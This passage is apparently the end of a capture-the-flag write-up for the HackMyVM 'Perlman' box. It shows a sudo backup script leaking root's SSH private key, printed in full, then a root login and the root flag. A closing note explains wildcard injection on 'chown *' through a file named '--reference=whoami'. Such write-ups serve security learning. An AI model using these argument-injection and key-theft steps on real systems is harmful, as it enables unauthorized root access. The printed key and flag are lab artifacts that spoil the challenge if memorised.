ze_perlman@perlman:~$ sudo /bin/bash /opt/backup/bk desired-root-2022
ze_perlman@perlman:~$ ls /opt/backup/ -alh
total 28K
drwxrwx--- 2 root ze_perlman 4.0K Feb 14 18:03 .
d-wxr-x--- 3 root ze_perlman 4.0K Sep 11  2022 ..
-rwxr-xr-x 1 root root        318 Jul 23  2022 bk
-rwx------ 1 root root       2.6K Feb 14 18:03 id_rsa
-rwx------ 1 root root       1.8K Feb 14 18:03 passwd
-rwx------ 1 root root       1.2K Feb 14 18:03 shadow
-rwx------ 1 root root        799 Feb 14 18:03 sudoers
```

Small problem, the directory is owned by `ze_perlman` too, meaning we can write to it.

```bash
ze_perlman@perlman:/opt/backup$ sudo bash /opt/backup/bk desired-root-2022 2>/dev/null
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ nano id_rsa.root
└─$ chmod 600 id_rsa.root
└─$ ssh -i id_rsa.root root@perlman.hmv
root@perlman:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@perlman:~# cat root.txt
0ca2710be21eabe7ddbf0240557bd210
```

## P.S.

Interesting technique demonstrated here in the root 
- [https://hgbe02.github.io/Hackmyvm/Perlman.html](https://hgbe02.github.io/Hackmyvm/Perlman.html)

Wildcard injection on chown. 

The script has `chown root:root *` which expands the `*` glob to all filenames in the directory. They created:
1. `whoami` a regular file owned by `ze_perlman` with `chmod 777`
2. `--reference=whoami` a file whose name looks like a `chown` flag

When `chown root:root *` runs, the shell expands `*` to:
```bash
chown root:root bk id_rsa passwd --reference=whoami shadow sudoers whoami
```

The `--reference=whoami` filename gets interpreted as a `chown` argument, telling `chown` to use `whoami`'s owner/group (`ze_perlman:ze_perlman`) instead of `root:root`. So all files get `chowned` to `ze_perlman` instead of root.

Result: `id_rsa, shadow, passwd, sudoers` all become owned by `ze_perlman` and readable.

This is the same class of attack as the classic tar wildcard injection (`--checkpoint-action`). Any command that uses `*` glob and has `--flag` style options is vulnerable if you can create filenames starting with `--`.

